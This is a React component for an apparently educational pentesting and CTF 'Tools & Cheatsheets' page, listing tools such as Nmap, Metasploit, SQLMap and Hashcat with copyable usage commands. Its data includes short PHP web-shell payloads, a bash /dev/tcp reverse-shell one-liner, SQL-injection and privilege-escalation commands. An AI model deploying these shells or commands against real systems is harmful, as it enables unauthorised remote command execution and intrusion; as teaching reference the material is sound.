import { useState } from 'react';
import { motion } from 'framer-motion';
import { Wrench, Search, Copy, Check, ExternalLink, Terminal, Shield, Globe, Lock, Cpu, Eye, Network } from 'lucide-react';

const staggerContainer = { hidden: { opacity: 0 }, visible: { opacity: 1, transition: { staggerChildren: 0.07 } } };
const staggerItem = { hidden: { opacity: 0, y: 20 }, visible: { opacity: 1, y: 0, transition: { duration: 0.4 } } };

interface Tool {
    id: string;
    name: string;
    category: string;
    icon: any;
    description: string;
    usage?: string;
    url?: string;
    tags: string[];
    type: 'tool' | 'cheatsheet';
}

const TOOLS: Tool[] = [
    { id: '1', name: 'Nmap', category: 'Network', icon: Network, description: 'Network exploration and security auditing tool. Port scanning, OS detection, and service version enumeration.', usage: 'nmap -sV -sC -oA scan <target>', url: 'https://nmap.org', tags: ['Port Scan', 'Network', 'Reconnaissance'], type: 'tool' },
    { id: '2', name: 'Burp Suite', category: 'Web', icon: Globe, description: 'Integrated platform for web application security testing. Proxy, scanner, and repeater included.', tags: ['Web Proxy', 'Scanner', 'Interceptor'], url: 'https://portswigger.net/burp', type: 'tool' },
    { id: '3', name: 'Metasploit', category: 'Exploitation', icon: Terminal, description: 'The most popular exploitation framework. Hundreds of modules for penetration testing.', usage: 'msfconsole\nsearch <exploit>\nuse exploit/<path>', tags: ['Exploit', 'Payload', 'Post-Exploitation'], type: 'tool' },
    { id: '4', name: 'John the Ripper', category: 'Password', icon: Lock, description: 'Fast password cracker with support for multiple hash formats and wordlists.', usage: 'john --wordlist=rockyou.txt hash.txt\njohn --show hash.txt', tags: ['Hash Cracking', 'Wordlist', 'Brute Force'], type: 'tool' },
    { id: '5', name: 'Ghidra', category: 'Reversing', icon: Cpu, description: 'Open-source reverse engineering framework from the NSA. Supports multiple architectures.', tags: ['Disassembler', 'Decompiler', 'Binary Analysis'], url: 'https://ghidra-sre.org', type: 'tool' },
    { id: '6', name: 'Wireshark', category: 'Network', icon: Eye, description: 'Real-time network packet analysis tool. Decodes over 3,000 protocols.', tags: ['Packet Analysis', 'PCAP', 'Protocol'], url: 'https://wireshark.org', type: 'tool' },
    { id: '7', name: 'SQLMap', category: 'Web', icon: Globe, description: 'Automated tool for SQL Injection detection and exploitation.', usage: 'sqlmap -u "http://target/page?id=1" --dbs\nsqlmap -u <url> -D db_name --tables', tags: ['SQLi', 'Automation', 'Database'], type: 'tool' },
    { id: '8', name: 'Linux Priv Esc Cheatsheet', category: 'Linux', icon: Shield, description: 'Collection of Linux privilege escalation techniques: SUID, cron jobs, writable paths, and capabilities.', usage: 'find / -perm -4000 2>/dev/null\ncat /etc/crontab\nLinPEAS.sh', tags: ['Privesc', 'SUID', 'Linux'], type: 'cheatsheet' },
    { id: '9', name: 'Web Shell Cheatsheet', category: 'Web', icon: Globe, description: 'Collection of web shells and payloads for PHP, ASP, and JSP. Useful for post-exploitation.', usage: '<?php system($_GET["cmd"]); ?>\n<?=`$_GET[0]`?>', tags: ['Web Shell', 'PHP', 'RCE'], type: 'cheatsheet' },
    { id: '10', name: 'Reverse Shell Generator', category: 'Exploitation', icon: Terminal, description: 'One-liner reverse shell references for multiple languages: bash, python, perl, ruby, and netcat.', usage: 'bash -i >& /dev/tcp/<ip>/<port> 0>&1\npython3 -c \'import socket...\'', tags: ['Reverse Shell', 'One-liner', 'RCE'], type: 'cheatsheet' },
    { id: '11', name: 'CyberChef', category: 'Crypto', icon: Lock, description: 'The Swiss army knife for encoding, decoding, encryption, and data analysis in a visual interface.', url: 'https://gchq.github.io/CyberChef', tags: ['Encoding', 'Decoding', 'Crypto'], type: 'tool' },
    { id: '12', name: 'Hashcat', category: 'Password', icon: Lock, description: 'GPU-accelerated password recovery tool. Supports 300+ hash algorithms.', usage: 'hashcat -m 0 hash.txt rockyou.txt\nhashcat -m 1800 shadow.txt wordlist.txt', tags: ['Hash Cracking', 'GPU', 'Password'], type: 'tool' },
];

const CATEGORIES = ['All', 'Network', 'Web', 'Exploitation', 'Password', 'Reversing', 'Linux', 'Crypto'];
const TYPES = ['All', 'tool', 'cheatsheet'];

const categoryColors: Record<string, string> = {
    Network: 'text-blue-400 bg-blue-500/10 border-blue-500/20',
    Web: 'text-green-400 bg-green-500/10 border-green-500/20',
    Exploitation: 'text-red-400 bg-red-500/10 border-red-500/20',
    Password: 'text-yellow-400 bg-yellow-500/10 border-yellow-500/20',
    Reversing: 'text-purple-400 bg-purple-500/10 border-purple-500/20',
    Linux: 'text-orange-400 bg-orange-500/10 border-orange-500/20',
    Crypto: 'text-cyan-400 bg-cyan-500/10 border-cyan-500/20',
};

function CopyButton({ text }: { text: string }) {
    const [copied, setCopied] = useState(false);
    const copy = () => {
        navigator.clipboard.writeText(text);
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
    };
    return (
        <button onClick={copy} className="flex items-center gap-1 text-xs text-gray-500 hover:text-cyan-400 transition-colors">
            {copied ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
            {copied ? 'Copied!' : 'Copy'}
        </button>
    );
}

export default function PlaygroundLearningTools() {
    const [search, setSearch] = useState('');
    const [category, setCategory] = useState('All');
    const [type, setType] = useState('All');

    const filtered = TOOLS.filter(t => {
        const matchSearch = t.name.toLowerCase().includes(search.toLowerCase()) ||
            t.description.toLowerCase().includes(search.toLowerCase()) ||
            t.tags.some(tag => tag.toLowerCase().includes(search.toLowerCase()));
        const matchCat = category === 'All' || t.category === category;
        const matchType = type === 'All' || t.type === type;
        return matchSearch && matchCat && matchType;
    });

    return (
        <div className="pt-32 pb-20">
            <div className="container-custom">
                {/* Hero */}
                <motion.div className="text-center mb-16" initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.6 }}>
                    <div className="w-20 h-1 bg-gradient-to-r from-cyan-500 to-blue-600 mx-auto mb-8 rounded-full" />
                    <div className="inline-flex p-4 rounded-xl border border-cyan-500/20 bg-cyan-500/5 mb-6">
                        <Wrench className="w-12 h-12 text-cyan-400" />
                    </div>
                    <h1 className="text-5xl lg:text-6xl font-bold mb-6">
                        <span className="text-white/90">Tools & </span>
                        <span className="bg-gradient-to-r from-cyan-400 to-blue-400 bg-clip-text text-transparent">Cheatsheets</span>
                    </h1>
                    <p className="text-lg text-gray-400 max-w-2xl mx-auto">
                        A complete reference of cybersecurity tools and essential command cheatsheets for pentesting, CTF, and forensics.
                    </p>
                </motion.div>

                {/* Filters */}
                <motion.div className="flex flex-col gap-4 mb-10" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.2 }}>
                    <div className="relative w-full max-w-md">
                        <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
                        <input type="text" placeholder="Search tools or cheatsheets..." value={search} onChange={e => setSearch(e.target.value)}
                            className="w-full bg-white/[0.03] border border-white/10 rounded-xl pl-10 pr-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-cyan-500/50 focus:ring-1 focus:ring-cyan-500/30 transition-all" />
                    </div>
                    <div className="flex flex-wrap gap-2">
                        {CATEGORIES.map(c => (
                            <button key={c} onClick={() => setCategory(c)} className={`px-3 py-1.5 rounded-lg text-xs font-semibold transition-all ${category === c ? 'bg-cyan-500 text-white' : 'bg-white/[0.05] text-gray-400 hover:text-white hover:bg-white/10'}`}>{c}</button>
                        ))}
                        <div className="w-px h-6 bg-white/10 mx-1 self-center" />
                        {TYPES.map(t => (
                            <button key={t} onClick={() => setType(t)} className={`px-3 py-1.5 rounded-lg text-xs font-semibold capitalize transition-all ${type === t ? 'bg-blue-500 text-white' : 'bg-white/[0.05] text-gray-400 hover:text-white hover:bg-white/10'}`}>{t === 'All' ? 'All Types' : t}</button>
                        ))}
                    </div>
                </motion.div>

                {/* Grid */}
                <motion.div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-5" variants={staggerContainer} initial="hidden" whileInView="visible" viewport={{ once: true }}>
                    {filtered.map(tool => {
                        const Icon = tool.icon;
                        const colorClass = categoryColors[tool.category] || 'text-gray-400 bg-white/5 border-white/10';
                        return (
                            <motion.div key={tool.id} variants={staggerItem} className="group flex flex-col rounded-xl border border-white/5 bg-white/[0.02] hover:bg-white/[0.04] hover:border-cyan-500/20 transition-all overflow-hidden">
                                <div className="p-5 flex-1">
                                    <div className="flex items-start justify-between mb-4">
                                        <div className="flex items-center gap-3">
                                            <div className="p-2.5 rounded-lg bg-cyan-500/10 border border-cyan-500/20">
                                                <Icon className="w-5 h-5 text-cyan-400" />
                                            </div>
                                            <div>
                                                <span className="block text-sm font-bold text-white">{tool.name}</span>
                                                <span className={`text-[10px] font-semibold px-2 py-0.5 rounded-full border ${colorClass}`}>{tool.category}</span>
                                            </div>
                                        </div>
                                        <span className={`text-[10px] font-semibold px-2 py-0.5 rounded-full capitalize ${tool.type === 'cheatsheet' ? 'bg-amber-500/10 text-amber-400 border border-amber-500/20' : 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/20'}`}>
                                            {tool.type}
                                        </span>
                                    </div>
                                    <p className="text-gray-400 text-sm leading-relaxed mb-4">{tool.description}</p>
                                    {tool.usage && (
                                        <div className="rounded-lg bg-black/40 border border-white/5 p-3 mb-3">
                                            <div className="flex items-center justify-between mb-2">
                                                <span className="text-[10px] text-gray-500 font-mono">Usage</span>
                                                <CopyButton text={tool.usage} />
                                            </div>
                                            <pre className="text-xs text-emerald-400 font-mono whitespace-pre-wrap leading-relaxed">{tool.usage}</pre>
                                        </div>
                                    )}
                                    <div className="flex flex-wrap gap-1.5">
                                        {tool.tags.map(tag => (
                                            <span key={tag} className="text-[10px] text-gray-500 bg-white/[0.04] border border-white/5 rounded-md px-2 py-0.5">{tag}</span>
                                        ))}
                                    </div>
                                </div>
                                {tool.url && (
                                    <div className="px-5 py-3 border-t border-white/5">
                                        <a href={tool.url} target="_blank" rel="noopener noreferrer" className="flex items-center gap-1.5 text-xs text-cyan-400 hover:text-cyan-300 transition-colors">
                                            <ExternalLink className="w-3.5 h-3.5" /> Visit Official Website
                                        </a>
                                    </div>
                                )}
                            </motion.div>
                        );
                    })}
                </motion.div>

                {filtered.length === 0 && (
                    <div className="text-center py-20">
                        <Search className="w-8 h-8 text-gray-600 mx-auto mb-3" />
                        <h3 className="text-xl font-bold text-white mb-2">No Results Found</h3>
                        <p className="text-gray-500">Try adjusting your filters or search terms.</p>
                    </div>
                )}
            </div>
        </div>
    );
}
